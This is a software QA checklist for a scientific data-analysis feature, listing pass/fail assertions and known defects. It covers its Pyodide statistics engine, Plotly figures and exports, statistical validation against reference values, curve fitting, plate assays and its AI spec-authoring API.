# Data Analysis — cross-check checklist

Written 2026-08-14 against branch `dev`. Every line is a pass/fail assertion a tester
can run. Anchors are `file:line` on `dev` at the time of writing; re-verify anchors
before relying on them.

Audience: whoever is checking that a figure or a number produced by this feature is
fit to go into a paper, a report, or a regulatory submission.

Legend for the status column in the findings tables at the end:
`CONFIRMED` verified in source by two independent reads ·
`REPORTED` a single review agent's finding, not yet independently confirmed.

---

## Read this before anything else

Two findings outrank every checklist item below, because they mean the feature is not
doing what it appears to be doing.

**1. Saving an analysis is broken in production.** Verified against the live database
(project `rutcjpugsrfoobsrufnn`) on 2026-08-14, not inferred from migration files:

- `scripts/105_saved_analyses.sql` and `scripts/106_analyses.sql` both declare
  `create table if not exists public.analyses` with **incompatible schemas**.
- The live table is the **106** shape: `title, table_type, analysis_type, runtime,
  analysis_spec, source_data_id, source_ref, source_fingerprint, source_analysis_ids,
  results, figure_spec, figure_data_id, code, status, error, ai_provenance`.
- All application code (`lib/data-analysis/saved-analysis.ts`) is written against the
  **105** shape. Every one of the six columns it reads and writes is **absent** from the
  live table: `draft_spec, spec, workspace_state, current_revision_no,
  source_data_file_id, draft_updated_at`.
- Because 105's `create table if not exists` was a no-op against 106's already-existing
  table, 105 created its `analysis_revisions` table and its RPCs but never its
  `analyses` columns.
- `commit_analysis_revision` is live and its body references `draft_spec` and
  `current_revision_no`, so it errors at runtime.
- Live row counts corroborate it: `analysis_revisions` = **0 rows**,
  `data_analysis_templates` = **0 rows**, `analyses` = 1 row.
- The live table also has `table_type`, `analysis_type`, and `analysis_spec` as NOT NULL
  with no default, and the 105-targeting code never sets any of them, so even an INSERT
  would fail.
- None of `103_data_analysis_templates.sql`, `105_saved_analyses.sql`, or
  `106_analyses.sql` appear in `public.schema_migrations`, so all three were applied
  outside the tracked ledger.

Consequence: autosave, explicit Save, revision commit, and reopen are all
non-functional. Every checklist item below that depends on persistence or
reproducibility (I3, and the reopen items) cannot pass until this is resolved. Resolving
it is a schema decision, not a code fix, and it needs a human: either migrate the live
`analyses` to the 105 shape and delete `106_analyses.sql`, or rewrite the application
code against 106. **Do not run `106_analyses.sql`**; its
`create index ... (source_data_id)` would abort mid-file against a 105-shaped table.

**2. There are two statistics engines and nothing checks that they agree.** See section
C0. For a life-sciences product this outranks every UI complaint.

**3. Four statistical correctness defects are confirmed in the engine.** These produce
numbers that are wrong, not merely unvalidated. See section N. The curve-fit weighting
defect and the repeated-measures reporting defect were verified in source during this
review; both are directly on the path a biosensor or immunoassay user takes.

---

## How this feature is built, in one page

Read this first; several checklist items only make sense against it.

- The page is `app/(app)/data-analysis/page.tsx` → `components/data-analysis/data-hub.tsx`
  → `components/data-analysis/data-analysis-workspace.tsx` (3,941 lines, all state in
  local `useState`, no store, no context).
- Five phases: Chart, Statistics, Standard curve, Plate, Figure layout
  (`data-analysis-workspace.tsx:611-616`).
- **There are two statistics engines, both live.** The spec-driven path computes in
  Python (`public/data-analysis-engine/notes9_engine.py`, 1,043 lines, in Pyodide in a
  Web Worker). The Statistics-tab rail computes in TypeScript
  (`lib/data-analysis/statistics.ts`, 1,017 lines). Nothing asserts they agree.
- Plot rendering is Plotly only. matplotlib is gone; Recharts is in the repo but not in
  this feature.
- **There are also two live Plotly layout builders**: the spec-driven
  `lib/data-analysis/render/plotly-adapter.ts:1319` (`buildFigure`) and a hand-rolled
  layout at `data-analysis-workspace.tsx:1159-1216`. They differ. Test both surfaces.
- The AI seam is one route, `app/api/data-analysis/spec-author/route.ts`. The model
  authors spec mutations; it never computes a number and never draws.
- The Python engine makes no network request after boot, and the engine result never
  leaves the browser.

---

## A. Runtime and environment

The runtime is the floor everything else stands on. If A fails, nothing below it means
anything.

- [ ] **A1** Pyodide boots on a cold load with an empty HTTP cache, on the slowest
      connection you support, inside the single 120 s budget
      (`ENGINE_TIMEOUT_MS`, `lib/data-analysis/engine/client.ts:91`). That budget covers
      boot *and* wheel load *and* compute, so a slow first analysis can time out with
      nothing wrong.
- [ ] **A2** The engine version stamped on a result matches the Pyodide build that
      actually executed. **Known to fail** when `NEXT_PUBLIC_PYODIDE_BASE_URL` points at
      the self-hosted mirror: `public/pyodide/pyodide-lock.json` is `0.28.0.dev0` while
      `lib/data-analysis/engine/contract.ts:29` pins and stamps `0.28.3`.
- [ ] **A3** The prebuilt package set is exactly `numpy, scipy, pandas, statsmodels,
      patsy` (`contract.ts:37`) and the runtime boots with no PyPI fetch —
      `ENGINE_PACKAGES.micropip` is `[]` (`contract.ts:45`) and the install branch is
      dead. Confirm no network request to `pypi.org` or `files.pythonhosted.org` after
      boot.
- [ ] **A4** scikit-learn is ABSENT. Any feature or doc promising PCA, clustering, or
      any sklearn model is either hand-implemented or vapour. Verify which before
      shipping such a claim.
- [ ] **A5** A worker crash surfaces a distinct message, not a spinner
      (`client.ts:67-73`, "The statistics engine crashed.").
- [ ] **A6** A worker timeout surfaces its own message (`client.ts:96-101`) and a late
      reply after timeout settles nothing (entry deleted before reject, `client.ts:99`).
- [ ] **A7** A Python exception becomes a typed `EngineError` with a user sentence, never
      a silent empty result (`notes9_engine.py:1021-1031`).
- [ ] **A8** A long-running analysis can be cancelled by the user. **Known to fail**:
      there is no `AbortSignal` into the engine. The only `AbortController` in the
      feature belongs to the AI fetch (`data-analysis-workspace.tsx:1837`).
- [ ] **A9** A large sheet does not hang the tab. **Known to fail**: no row cap, no
      column cap, no memory cap anywhere in `resolvePayload`
      (`lib/data-analysis/engine/resolver.ts:410`); the whole post-filter table is
      `JSON.stringify`d across the worker boundary (`engine/worker.ts:150`).
- [ ] **A10** The engine warms up before the user's first analysis. **Known to fail**:
      `warmUpEngine()` (`client.ts:124`) is called only from `hooks/use-analysis-spec.ts:174`,
      and that hook is imported by nothing. No warm-up runs in the shipped UI.
- [ ] **A11** The worker is disposed on sign-out. **Known to fail**: `disposeEngine()`
      (`client.ts:333`) is called only from `client.test.ts:133`. The worker and the
      result cache live for the tab's lifetime.
- [ ] **A12** The result cache key changes when the data or the computational spec
      changes, and does *not* change on restyling (`contract.ts:381-399`). Restyle a
      figure and confirm no recompute; change a filter and confirm one.
- [ ] **A13** Uploading a file larger than 10 MB is refused with a visible message
      (`lib/attachment-types.ts:11`, checked at `data-analysis-workspace.tsx:2116`).

---

## B. Plot generation

### B1. Spec-to-figure correctness

- [ ] **B1.1** All 24 `FigureKind` members render without error
      (`lib/data-analysis/spec/analysis-spec.ts:363-395`; builders dispatched at
      `plotly-adapter.ts:1337-1406`). Covered by an existing test; re-run it.
- [ ] **B1.2** Every chart type round-trips through the rail controls. **Known to fail**
      for `grouped-bar` and `dose-response`: `CHART_TYPE_TO_FIGURE_KIND`
      (`lib/data-analysis/workspace/chart-state-spec.ts:33-56`) has 22 entries for 24
      kinds, and `chartStateFromSpec` silently keeps the previous chart type when the
      reverse lookup misses (`chart-state-spec.ts:425-426`). Save a dose-response
      analysis, reopen it, and confirm the chart type shown is the one stored.
- [ ] **B1.3** `barmode` is correct per chart kind. `plotly-adapter.ts:1518` sets
      `"group"` for `grouped-bar` and `"stack"` for **everything else**. Render a
      multi-series `bar-scatter-error` and confirm the bars are not silently stacked.
- [ ] **B1.4** Axis labels render, and a declared unit appears as `Label (unit)`
      (`plotly-adapter.ts:116`).
- [ ] **B1.5** A log axis is genuinely log, and any declared min/max is converted into
      log units rather than passed through raw (`plotly-adapter.ts:161, 176-181`).
- [ ] **B1.6** A log axis containing a zero or negative value either drops those points
      with a visible warning or refuses the transform. Silently dropping them changes
      the figure without telling anyone.
- [ ] **B1.7** The error-bar type in use is stated on the figure itself, not only in a
      settings panel (`plotly-adapter.ts:1480-1494`). A reader must be able to tell
      SD from SEM from 95% CI from the figure alone.
- [ ] **B1.8** All nine error-bar kinds compute correctly: `sd, sem, ci90, ci95, ci99,
      range, iqr, mad, none` (`analysis-spec.ts:405-415`; arithmetic at
      `plotly-adapter.ts:286-338`). Check the CI variants against a known t-critical
      value; the t-distribution is reimplemented in JS here
      (`lib/data-analysis/distributions.ts`).
- [ ] **B1.9** Excluded points are drawn greyed, not removed
      (`EXCLUDED_COLOUR = "#b9b2a8"`, `plotly-adapter.ts:37`). A reader must see that a
      point was excluded.
- [ ] **B1.10** Significance brackets come from the post-hoc result, name the test, and
      the stars match the p-value (`plotly-adapter.ts:1237`).
- [ ] **B1.11** Confidence bands are drawn for fitted curves and are the band the fit
      actually produced (`plotly-adapter.ts:548, 640, 1142`).
- [ ] **B1.12** A secondary Y axis works end to end (`SeriesStyle.axis`,
      `analysis-spec.ts:439`; `FigureSpec.y2`, `:536`).
- [ ] **B1.13** Multi-panel figure layouts place panels, labels, and spans correctly
      (`lib/data-analysis/render/figure-layout.ts:38, 78, 161-344`).
- [ ] **B1.14** Clicking a mark identifies the source row (`customdata` = `rowId`,
      read back by `rowIdAtPoint`, `plotly-adapter.ts:1544`).

### B2. Theming, colour, and accessibility of the figure

- [ ] **B2.1** Charts are legible in dark mode. **Known to fail** on the spec-driven
      path: `plotly-adapter.ts:1493-1497` sets `paper_bgcolor` and `plot_bgcolor` to
      transparent and gives `font` no `color`, so Plotly's `#444` default ink renders
      dark grey on a dark background. No `.js-plotly-plot` or `.main-svg` CSS override
      exists anywhere in `app/globals.css` or `styles/`.
- [ ] **B2.2** Toggling light↔dark recolours the chart immediately. **Suspect** on the
      legacy path: `isDark` at `data-analysis-workspace.tsx:964` is a synchronous
      `document.documentElement.classList` read, not reactive state, so it may not
      re-evaluate on a theme change.
- [ ] **B2.3** The first client render is not always the light palette. The same DOM
      read is SSR-unsafe by design (`typeof document !== "undefined"`).
- [ ] **B2.4** The default palette is colour-blind safe. Default `okabe-ito` is.
      Twelve of the sixteen qualitative palettes in
      `lib/data-analysis/render/palettes.ts:49-269` carry `cvdSafe: false`
      (`nature, science, lancet, nejm, jama, teal-amber, prism, notes9, dark2, set2,
      paired, piyg`) and are all freely selectable. Confirm the UI warns when one is
      chosen, or accept that it does not.
- [ ] **B2.5** Colour is never the only channel separating series. **Confirmed to
      fail**: `styleFor` (`plotly-adapter.ts:188-201`) cycles only `colour` by series
      index (`palette[index % palette.length]`, line 192). `pointShape` hard-defaults to
      `"circle"` (line 193) and `lineStyle` to `"solid"` (line 197) with no index
      cycling. A multi-series chart on a non-CVD-safe palette is unreadable to a
      colour-blind reader unless per-series shapes were hand-authored. The one place
      shape *is* used as a channel is the excluded-point state (`circle-open`, lines
      469, 533), which is a state indicator, not series identity.
- [ ] **B2.6** Point and line colours meet 3:1 contrast against the chart background.
      **Confirmed to fail** for at least three in-use values: Okabe-Ito yellow `#F0E442`
      measures 1.32:1 against white, and diverging-ramp stops `#F4A582` (≈2.0:1) and
      `#FDDBC7` (≈1.3:1) also fall short. Heatmap area fills are exempt under 1.4.11
      since cell boundaries carry the information; markers and thin lines are not.
- [ ] **B2.7** Chart text meets contrast minimums against both light and dark
      backgrounds at the exported size, not just on screen.

### B3. Export fidelity

- [ ] **B3.1** PNG export writes a correct `pHYs` DPI chunk and the file opens at the
      stated DPI in a journal submission tool (`lib/data-analysis/chart-export.ts:69-80, 311`).
- [ ] **B3.2** JPEG export writes JFIF density and downloads with a `.jpg` extension
      (`chart-export.ts:312-313`).
- [ ] **B3.3** TIFF export writes XResolution/YResolution, and CMYK output is labelled
      as **uncalibrated** wherever a user sees it (`chart-export.ts:292-299`). An
      uncalibrated CMYK separation sent to a printer will not match the screen.
- [ ] **B3.4** SVG export is true vector and text remains text (`chart-export.ts:273`).
- [ ] **B3.5** PDF export keeps live, selectable text (`vectorToPdf`,
      `chart-export.ts:278`, `lib/data-analysis/svg-vector.ts`).
- [ ] **B3.6** EPS export opens in Illustrator and in a journal's preflight
      (`chart-export.ts:283`).
- [ ] **B3.7** Transparency is offered only where it is supported (PNG), and is disabled
      elsewhere rather than silently ignored (`components/data-analysis/export-menu.tsx:359-363`).
- [ ] **B3.8** Alpha is flattened onto white, not onto black, for formats without alpha
      (`chart-export.ts:308-309`).
- [ ] **B3.9** Each journal preset produces the exact width in millimetres and DPI it
      names (`export-menu.tsx:40-45`).
- [ ] **B3.10** The exported figure is pixel-identical in content to what is on screen:
      same data, same exclusions, same annotations, same fonts. Fonts are hardcoded
      literal families rather than CSS variables specifically so export matches
      (`plotly-adapter.ts:57-60`) — verify that holds.
- [ ] **B3.11** The chart's underlying data can be exported as CSV. **Known gap**: there
      is no CSV option in the chart export menu, and
      `exportSnapshotFirstSheetAsCsv` (`lib/spreadsheet-workbook.ts:293`) is not wired to
      any button in this feature.
- [ ] **B3.12** `chart-export.ts` has automated tests. **Known to fail**: there is no
      `chart-export.test.ts`. `pHYs`, JFIF density, TIFF tags, CMYK separation, and
      white-flatten are all untested.

---

## C. Statistical analysis

### C0. The one that matters most

- [ ] **C0.1** The Statistics tab (TypeScript, `lib/data-analysis/statistics.ts`) and
      the spec workspace (Python, `notes9_engine.py`) produce the **same number** for
      the same test on the same data. **No test asserts this today.** Run, at minimum:
      unpaired t, Welch t, paired t, one-way ANOVA, Kruskal-Wallis, Mann-Whitney,
      Wilcoxon, Pearson, Spearman, Dunn, Tukey, chi-square, Fisher exact — on identical
      input, in both surfaces, and diff the p-values to 6 significant figures.
- [ ] **C0.2** Kaplan-Meier agrees across its **three** implementations:
      `notes9_engine.py` `_km_curve` (with Greenwood CI),
      `lib/data-analysis/chart-transforms.ts:51` (no CI), and the adapter's own KM trace
      builder.
- [ ] **C0.3** The Python engine has automated tests. **Known to fail**: there is no
      pytest suite, no Pyodide integration test, and no validation corpus, despite
      `engine/worker.ts:7` referring to one. Every p-value the product ships is computed
      by untested code.

### C1. Golden-value validation

Validate against a reference implementation, not against the code's own output.
Self-consistent tests over wrong maths pass forever.

- [ ] **C1.1** Welch t-test on R's `sleep` dataset returns `t = -1.8608`,
      `df = 17.776`, `p = 0.07939`.
- [ ] **C1.2** Student's (pooled) t on the same data returns `t = -1.8608`, `df = 18`,
      `p = 0.07919`.
- [ ] **C1.3** One-way ANOVA on R's `PlantGrowth` returns `F = 4.846`, `df = (2, 27)`,
      `p = 0.01591`.
- [ ] **C1.4** Tukey HSD on `PlantGrowth` returns the trt2−ctrl adjusted
      `p = 0.012`.
- [ ] **C1.5** Mann-Whitney with ties matches `scipy.stats.mannwhitneyu` exactly,
      including the tie correction and the `method="auto"` exact/normal switch
      (`notes9_engine.py:421`).
- [ ] **C1.6** Wilcoxon signed-rank with zeros matches `scipy.stats.wilcoxon` including
      the zero-handling rule.
- [ ] **C1.7** Spearman with ties matches `scipy.stats.spearmanr`.
- [ ] **C1.8** Chi-square on a 2×2 applies Yates' continuity correction and matches R's
      `chisq.test` default (`notes9_engine.py:599`).
- [ ] **C1.9** Fisher exact on a 2×2 matches R's `fisher.test` two-sided p, which is not
      simply twice the one-sided p.
- [ ] **C1.10** Repeated-measures ANOVA matches `statsmodels.AnovaRM`, and
      Greenhouse-Geisser correction is applied when sphericity fails
      (`notes9_engine.py:489, 506`).
- [ ] **C1.11** Two-way ANOVA uses Type II sums of squares and matches
      `anova_lm(typ=2)` (`notes9_engine.py:524`), and the interaction term is reported.
- [ ] **C1.12** Dunn's test (hand-implemented, `notes9_engine.py:313`) matches
      `scikit-posthocs.posthoc_dunn` including its tie correction and its p-adjustment.
- [ ] **C1.13** Mauchly's sphericity (hand-implemented, `notes9_engine.py:194`) matches
      a reference on a dataset where it is known to fail.
- [ ] **C1.14** Log-rank matches R's `survdiff` on a censored dataset.
- [ ] **C1.15** Greenwood's variance produces the same KM confidence band as R's
      `survfit`.

### C2. Reporting discipline

- [ ] **C2.1** Every test reports its assumption checks by default, not on request. The
      engine docstring claims this; verify **per test**. Named checks that exist:
      Shapiro-Wilk (`notes9_engine.py:162`), Levene median-centred (`:178`), Mauchly
      (`:194`).
- [ ] **C2.2** When an assumption fails, the result names a concrete alternative test
      rather than only warning (`AssumptionCheck.verdict` + `alternative`,
      `engine/contract.ts:91-98`).
- [ ] **C2.3** Every test reports an effect size. 16 kinds are declared in the union
      (`contract.ts:113-136`) but only Hedges' g is explicitly constructed
      (`notes9_engine.py:225`). Verify each declared kind is actually produced by the
      test that claims it, and that Hedges' g carries the small-sample bias correction
      that distinguishes it from Cohen's d.
- [ ] **C2.4** Confidence intervals accompany the effect size, and their level is stated.
- [ ] **C2.5** `n` is reported, and it is the `n` after exclusions and after the
      missing-value strategy ran, not the raw row count.
- [ ] **C2.6** One- versus two-tailed is stated explicitly and defaults to two-tailed.
- [ ] **C2.7** The post-hoc correction in use is named on the output. Available:
      `tukey, dunnett, sidak, bonferroni, holm-sidak, dunn, none`
      (`analysis-spec.ts:293-301`).
- [ ] **C2.8** The report sentence is generated from computed values, never by the model
      (Law 2). It is built in Python (`contract.ts:246, 261`) — verify no prose path
      bypasses that.
- [ ] **C2.9** p-values are never reported as `p = 0.000`. Report `p < 0.001`.
- [ ] **C2.10** Significant figures are consistent and defensible; a p-value carried to
      15 decimal places is a bug in presentation.

### C3. Numerical robustness

Each of these should refuse clearly, not return a number.

- [ ] **C3.1** n = 1, n = 2, and n = 3 per group.
- [ ] **C3.2** All values identical (zero variance) in one or both groups.
- [ ] **C3.3** A group with every value missing.
- [ ] **C3.4** Wildly unequal group sizes (2 vs 200).
- [ ] **C3.5** NaN and Inf in the input. `_scrub` (`notes9_engine.py:88`) strips them
      for JSON safety — confirm that stripping does not silently change a result.
- [ ] **C3.6** A single group passed to a two-group test.
- [ ] **C3.7** Perfectly correlated and perfectly anti-correlated inputs.
- [ ] **C3.8** Very large and very small magnitudes (1e-12, 1e12) in the same column.
- [ ] **C3.9** The resolver's fail-closed guards fire rather than the engine crashing.
      Codes to exercise: `no-rows, no-numeric, too-few-levels, no-subject, pair-levels,
      no-second-factor, need-two-categoricals, table-too-small, need-xy, no-model,
      too-few-points, too-few-concentrations, need-survival, no-response, no-group,
      too-few` (`engine/resolver.ts:472-912`). Each should carry a `fix:` string.

### C4. Data preparation

- [ ] **C4.1** Transforms apply **in declared order** (`resolver.ts:263, 437`).
      Reordering log10 and normalise changes the answer.
- [ ] **C4.2** `collapseReplicates` (mean or median) averages the intended grouping and
      reports the resulting n (`analysis-spec.ts:118-181`).
- [ ] **C4.3** `normaliseToControl` scopes correctly when `per[]` names a plate or batch
      column, so plate 1 normalises to plate 1's control.
- [ ] **C4.4** `baselineSubtract` handles both a blank group and a literal blank value.
- [ ] **C4.5** The missing-value strategy that ran is the one declared, and the number
      of rows dropped is shown to the user (`resolver.ts:218-232`, warning at `:223`).
      Default is `listwise`.
- [ ] **C4.6** Blank cells arrive as the value the missing-value logic expects.
      `snapshot-table.ts:38` coerces blanks to `""`, not `null` — verify downstream
      treats `""` as missing.
- [ ] **C4.7** `pivotLonger` reshapes wide instrument output correctly.
- [ ] **C4.8** Every exclusion carries a typed reason (`technical-failure, contamination,
      instrument-error, pre-registered-criterion, statistical-outlier, other`,
      `analysis-spec.ts:212-220`) and a with/without sensitivity comparison
      (`ExclusionImpact`, `contract.ts:275-284`).
- [ ] **C4.9** No outlier is ever removed automatically without a recorded reason.
- [ ] **C4.10** Grubbs' test exists on the TypeScript side only
      (`lib/data-analysis/statistics.ts`). Confirm the Statistics tab and the spec
      workspace do not disagree about which points are outliers.

---

## D. Curve fitting and calibration

- [ ] **D1** A 12-point standard curve with 3 replicates fitted 4PL reports EC50/IC50
      **with a 95% CI**, R², adjusted R², AICc, Sy.x, and per-parameter SE
      (`contract.ts:194-214`).
- [ ] **D2** Non-convergence is reported as failure, not drawn as a confident curve.
      `converged` and `iterations` are in the result contract; verify the UI honours
      them. `maxfev = 20000` (`notes9_engine.py:864`).
- [ ] **D3** Back-calculated unknowns outside the fitted range are flagged. The
      `inRange` flag exists in the contract; verify it reaches the user visibly.
- [ ] **D4** Fit weighting (`none`, `1/Y`, `1/Y²`) is selectable and changes the fit
      (`lib/data-analysis/curve-fitting.ts:34`). Immunoassay data is heteroscedastic;
      unweighted 4PL over-weights the top of the curve.
- [ ] **D5** All 10 declared `NonlinearModel` members actually dispatch:
      `4pl, 3pl, 5pl, log-agonist-vs-response, michaelis-menten, one-site-binding,
      exponential-decay, exponential-growth, linear, semi-log`
      (`analysis-spec.ts:304-315`). Only `_four_pl`, `_three_pl`, `_five_pl` are visible
      as explicit model functions (`notes9_engine.py:826-834`). **Verify the other seven
      before treating them as shipped.**
- [ ] **D6** R² is not presented as the primary goodness-of-fit metric for a nonlinear
      model. It is a poor one. Residual plots and Sy.x are better; confirm they are
      offered.
- [ ] **D7** Residuals are inspectable, not only summarised.
- [ ] **D8** Model comparison by AICc weight works (`curve-fitting.ts:553`) and states
      which model won and by how much.
- [ ] **D9** Blank subtraction happens before fitting, and the order is visible.
- [ ] **D10** A dilution series with a known concentration recovers that concentration
      within an acceptable percent recovery.
- [ ] **D11** Endpoint titre calculation is correct (`curve-fitting.ts:566`).
- [ ] **D12** The TypeScript `fitCurve` (`curve-fitting.ts:448`, used by the Standard
      curve panel and Plate view) and the Python `run_dose_response`
      (`notes9_engine.py:838`) agree on the same data. This is the C0.1 problem again,
      in the curve-fitting surface.

---

## E. Plate and replicate experiments

- [ ] **E1** A 96-well and a 384-well plate parse correctly, including the origin
      row/column offset (`lib/data-analysis/plate.ts:64`,
      `components/data-analysis/plate-view.tsx:288`).
- [ ] **E2** Well roles are honoured: `empty, blank, standard, sample, control`
      (`plate.ts`).
- [ ] **E3** Standards and samples are extracted correctly (`standardsFromPlate`
      `plate.ts:152`, `samplesFromPlate` `:218`).
- [ ] **E4** Technical and biological replicates are distinguishable. If the spec cannot
      express the difference, say so plainly rather than averaging them together —
      averaging technical replicates into a biological n is a classic pseudo-replication
      error that inflates significance.
- [ ] **E5** CV% per replicate group is reported.
- [ ] **E6** Normalisation to a positive and a negative control produces percent-of-control.
- [ ] **E7** Z'-factor is computed for screening plates. **Verify presence**; it is the
      standard plate-quality metric and its absence is a real gap for screening users.
- [ ] **E8** Edge effects and plate/batch effects are at least detectable, ideally
      flagged.
- [ ] **E9** Well-level exclusion carries a reason and is visible on the plate map.
- [ ] **E10** `lib/data-analysis/plate.ts` has automated tests. **Known to fail**: there
      is no `plate.test.ts`.

---

## F. Biosensor time-series and sensorgrams

This section is a gap list as much as a checklist; several items are expected to be
ABSENT and are listed so the absence is a decision rather than a surprise.

- [ ] **F1** A current-vs-time amperometric trace imports and plots with correct time
      units (`line-timecourse` is a supported `FigureKind`).
- [ ] **F2** Baseline drift correction over a time window is available.
- [ ] **F3** A response window can be integrated (charge from current, area under a peak).
- [ ] **F4** Peak detection with a stated threshold rule.
- [ ] **F5** Signal-to-noise ratio is computed from a declared blank/noise window.
- [ ] **F6** **LOD and LOQ** are computed from the blank SD and the calibration slope
      (`LOD = 3.3σ/S`, `LOQ = 10σ/S`) and are reported with the convention used. This is
      the single most-cited number in a biosensor paper.
- [ ] **F7** The linear dynamic range is reported with its upper and lower bounds.
- [ ] **F8** Sensitivity is reported as the calibration slope with its units
      (e.g. µA·mM⁻¹·cm⁻²) and its standard error.
- [ ] **F9** Michaelis-Menten fitting is available for enzymatic sensors and reports
      K_M(app) and I_max with CIs. `michaelis-menten` is declared in `NonlinearModel`;
      see D5.
- [ ] **F10** Hill coefficient is reported where a cooperative binding model is fitted.
- [ ] **F11** SPR/BLI association and dissociation kinetics (k_a, k_d, K_D) are fittable.
- [ ] **F12** EIS/impedance data plots as Nyquist and Bode, and equivalent-circuit
      parameters (R_ct, C_dl) are extractable.
- [ ] **F13** Selectivity and interference are expressible as a comparison across
      interferent conditions.
- [ ] **F14** Sensor-to-sensor reproducibility across a batch is reportable as a CV%
      with n sensors stated.
- [ ] **F15** Operational and storage stability over time plots with the retained-response
      percentage.
- [ ] **F16** Units are carried through every transform. A slope in the wrong units is a
      wrong result that looks right.

---

## G. Omics and high-dimensional

- [ ] **G1** qPCR ΔΔCt with amplification-efficiency correction.
- [ ] **G2** Multiple-testing correction is available and named: Bonferroni, Holm, and
      Benjamini-Hochberg FDR. `pAdjust` exists on the TypeScript side
      (`lib/data-analysis/statistics.ts:619`); confirm the Python path offers the same.
- [ ] **G3** A volcano plot draws with the correct fold-change threshold
      (`FigureSpec.volcanoFoldChange`) and the significance threshold is stated.
- [ ] **G4** A heatmap uses a sequential palette and states its scale
      (`plotly-adapter.ts:755`).
- [ ] **G5** A correlation matrix uses a diverging palette centred on zero
      (`plotly-adapter.ts:1087-1089`).
- [ ] **G6** PCA is available. **Expected ABSENT** — scikit-learn is not in the runtime
      (A4). If PCA is offered anywhere in the UI, find out what computes it.
- [ ] **G7** Hierarchical clustering with a stated linkage and distance metric.
      Same caveat as G6.
- [ ] **G8** Log and variance-stabilising transforms are available and their effect on
      zeros is defined.

---

## H. Data ingestion

- [ ] **H1** CSV, TSV, TXT, XLSX, XLS, and `.n9a` all import
      (`data-analysis-workspace.tsx:3406`). Note the persisted format type only covers
      `csv | xlsx | xls` (`lib/spreadsheet-workbook.ts:10`) and the Files list only
      offers `.csv/.xlsx/.xls` (`components/data-analysis/data-files-list.tsx:89-91`) —
      confirm a TSV opened from the Files list is not silently unavailable.
- [ ] **H2** A sheet with a title row above the table imports with correct column names.
      **Known to fail**: `snapshotToTable` takes row 0 verbatim
      (`lib/data-analysis/workspace/snapshot-table.ts:32-33`). `detectHeader`
      (`lib/data-analysis/workspace/bootstrap.ts:349`) handles title rows, two-row merged
      headers, unit rows, and footnotes — and is **not used on the live path** because
      nothing persists the `HeaderPlan`.
- [ ] **H3** A sheet with a dedicated units row imports with units attached to columns
      rather than as a data row. Same known failure as H2.
- [ ] **H4** A two-row merged header imports correctly. Same known failure as H2.
- [ ] **H5** Numeric coercion is correct for values with thousands separators, currency
      symbols, percent signs, scientific notation, and leading apostrophes
      (`snapshot-table.ts:38`).
- [ ] **H6** A value like `1/2` or `2026-08-14` is not silently coerced to a number.
- [ ] **H7** Plate-reader, qPCR, and instrument-native exports import. **Expected
      PARTIAL**: there are no instrument-format parsers. `lib/data-analysis/detect.ts`
      only classifies plate and standard-curve *shapes* heuristically after a generic
      sheet has loaded (`detect.ts:8-50`).
- [ ] **H8** The Data page's `experiment_data` read is capped at 500 rows
      (`app/(app)/data-analysis/page.tsx:31`). Confirm a user with more than 500 data
      files is told the list is truncated rather than silently shown a subset.
- [ ] **H9** `lib/data-analysis/detect.ts` has automated tests. **Known to fail**: no
      `detect.test.ts`.

---

## I. API contract, UI, and follow-up

These are the items behind the three problems reported directly: unclean contracts,
unclear continuation, and no follow-up on a plot.

### I1. Contract cleanliness

- [ ] **I1.1** The request body of `/api/data-analysis/spec-author` is described by
      **one** type, imported by both sides. **Known to fail**: `SpecAuthorRequest`
      (`app/api/data-analysis/spec-author/route.ts:62-66`, every field `unknown`) and
      `SpecPatchRequest` (`lib/data-analysis/ai/spec-author-client.ts:48-53`) are two
      independent hand-written declarations kept in sync by a code comment at
      `route.ts:307`.
- [ ] **I1.2** The response is one discriminated union with a discriminant on **every**
      branch. **Known to fail**: seven inline object literals on the server, and the
      success case (`route.ts:484`) has no `outcome` field, so the client manufactures
      one at `spec-author-client.ts:128`.
- [ ] **I1.3** The 401 response has the same envelope shape as every other failure.
      **Known to fail**: it returns `{ error }` while everything else returns
      `{ outcome, reason }` (`route.ts:215, 293`).
- [ ] **I1.4** The response payload is validated on arrival, not cast. **Known to fail**:
      `Array.isArray(reply.mutations) ? (reply.mutations as SpecMutation[]) : []`
      (`spec-author-client.ts:126-131`) — a malformed reply silently becomes "no changes
      needed".
- [ ] **I1.5** Client and server cannot drift without a compile error. Today they can.
- [ ] **I1.6** The mutation contract advertised to the model matches what the validator
      accepts. **Known to fail**: `MUTATION_CONTRACT` is generated from all 32 schema
      kinds (`lib/data-analysis/spec/mutation-schema.ts:216`) while `validateProposal`
      accepts 28 (`lib/data-analysis/ai/spec-author.ts:343-349`). A model asked to
      reword a caption emits `figure.setCaption`, is rejected, and burns the repair round
      on a kind it was told it had. The system prompt (`spec-author.ts:510`) does not
      warn about it.
- [ ] **I1.7** Request size is bounded. **Known to fail**: `spec-author` imports none of
      `lib/limits/guards.ts`. The only bound is `SPEC_AUTHOR_PROMPT_MAX_CHARS = 4000`.
      The `table` field is unbounded — `route.ts:252-268` checks only that `columns` and
      `rows` are non-empty arrays, then `toDataProfile` (`route.ts:105-121`) iterates
      every row per numeric column inside a 60 s budget. Compare `app/api/agent/run/route.ts:17, 24-30`,
      which does use the guards.
- [ ] **I1.8** Saved template `config` is schema-validated before storage.
      **Known to fail**: `app/api/data-analysis/templates/route.ts:54` stores arbitrary
      JSON, which is later read back and used to drive a chart.
- [ ] **I1.9** Raw data rows never cross to the model. Currently **passing** — only a
      summary profile is sent (`route.ts:84-121`), asserted by an existing test.

### I2. One composer, and follow-up

- [ ] **I2.1** There is exactly **one** AI text input on the page. **Known to fail**:
      `CatalystSectionHero` at `data-analysis-workspace.tsx:3308` (a launcher — fires
      the `notes9:open-catalyst` CustomEvent, opens the right sidebar, and changes
      nothing on the page) and the spec prompt `<Input>` at `:3168` (posts to
      `/api/data-analysis/spec-author`, the only one that can change the figure). Using
      the first opens a **third** input, the persistent composer at
      `components/layout/right-sidebar.tsx:3979`.
- [ ] **I2.2** A user can tell, without experimenting, which input changes their chart.
- [ ] **I2.3** A second message can refer to the first. **Known to fail**: the request
      body is `{prompt, spec, table}` and nothing else
      (`data-analysis-workspace.tsx:1867`). No thread id, no history, no prior rationale.
- [ ] **I2.4** When the assistant asks a clarifying question, the user can answer it.
      **Known to fail**: `clarificationNeeded` withholds Execute
      (`lib/data-analysis/workspace/spec-prompt.ts:356`), and the only affordance is a
      fresh prompt carrying neither the question nor the previous message.
- [ ] **I2.5** The conversation is visible as a transcript. **Known to fail**: `aiReply`
      and `aiProposal` are single-slot state cleared each turn
      (`data-analysis-workspace.tsx:1836, 1854`).
